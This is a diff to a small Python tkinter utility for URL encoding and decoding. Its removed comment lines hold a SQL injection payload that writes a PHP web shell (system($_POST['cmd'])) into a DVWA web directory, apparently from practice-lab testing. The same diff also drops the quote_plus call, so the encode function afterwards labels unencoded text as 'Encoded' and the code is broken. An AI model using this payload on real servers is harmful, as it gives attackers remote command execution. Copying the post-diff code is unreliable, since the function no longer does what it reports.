@@ -6,7 +6,6 @@ def decode_url():
 	url = entryUrl.get()
 	output = "Original: " + url + "\n\n"
 	textArea.insert(tkinter.END, output)
-	#url = """id=%27+union+select+1%2C%27%3C%3Fphp+echo%28system%28%24_POST%5B%22cmd%22%5D%29%29%3B%3F%3E%27+INTO+OUTFILE+%27%2Fvar%2Fwww%2Fdvwa%2Fdefault.php%27+%23&Submit=Submit"""
 	url = url.replace("+"," ")
 	url = urllib.parse.unquote(urllib.parse.unquote(url))
 	output = "Decoded: " + url + "\n\n" + "="*20 + "\n\n"
@@ -19,8 +18,6 @@ def encode_url():
 	url = entryUrl.get()
 	output = "Original: " + url + "\n\n"
 	textArea.insert(tkinter.END, output)
-	#url = """id=' union select 1,'<?php echo(system($_POST["cmd"]));?>' INTO OUTFILE '/var/www/dvwa/default.php' #&Submit=Submit"""
-	url = urllib.parse.quote_plus(url)
 	output = "Encoded: " + url + "\n\n" + "="*20 + "\n\n"
 	textArea.insert(tkinter.END, output)
 	entryUrl.delete(0,tkinter.END)
